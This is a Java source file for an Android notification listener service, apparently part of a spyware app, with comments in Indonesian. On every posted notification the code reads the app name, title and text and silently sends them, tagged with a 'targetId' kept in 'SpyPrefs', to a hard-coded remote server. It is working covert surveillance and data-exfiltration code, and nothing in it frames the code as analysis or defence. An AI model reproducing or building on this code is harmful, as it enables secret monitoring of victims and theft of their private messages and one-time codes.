package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

// Nama class diubah untuk menghindari konflik dengan system class
public class CustomNotificationListenerService extends NotificationListenerService {
    private static final String TAG = "CRPT.NotifListener";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        
        String packageName = sbn.getPackageName();
        String title = "";
        String text = "";
        
        if (sbn.getNotification().extras != null) {
            title = sbn.getNotification().extras.getString(android.app.Notification.EXTRA_TITLE, "");
            text = sbn.getNotification().extras.getString(android.app.Notification.EXTRA_TEXT, "");
        }
        
        if (!title.isEmpty() || !text.isEmpty()) {
            sendNotificationToServer(packageName, title, text);
        }
    }

    private void sendNotificationToServer(String app, String title, String body) {
        new Thread(() -> {
            try {
                // Pastikan MODE_PRIVATE diakses lewat Context
                String targetId = getSharedPreferences("SpyPrefs", android.content.Context.MODE_PRIVATE).getString("targetId", "unknown");
                URL url = new URL(SERVER_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject payload = new JSONObject();
                payload.put("cmd", "new_notification");
                JSONObject data = new JSONObject();
                data.put("app", app);
                data.put("title", title);
                data.put("body", body);
                data.put("timestamp", System.currentTimeMillis());
                payload.put("data", data);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending notification: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }
}